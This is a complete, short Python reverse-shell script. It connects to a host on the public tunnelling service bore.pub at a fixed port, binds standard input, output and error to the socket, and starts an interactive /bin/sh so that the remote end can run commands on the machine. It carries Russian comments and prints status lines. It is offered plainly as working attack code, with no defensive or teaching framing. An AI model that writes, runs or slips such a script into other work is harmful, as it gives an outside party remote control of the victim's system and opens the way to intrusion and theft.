import socket
import subprocess
import os

HOST = "bore.pub"
PORT = 30098

print(f"[+] Trying to connect to {HOST}:{PORT}...")

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect((HOST, PORT))

    print("[+] Connection established! Reverse shell starting...")

    # Перенаправляем stdin, stdout, stderr в сокет
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    # Запускаем интерактивный shell
    subprocess.call(["/bin/sh", "-i"])

except Exception as e:
    print(f"[-] Error: {e}")
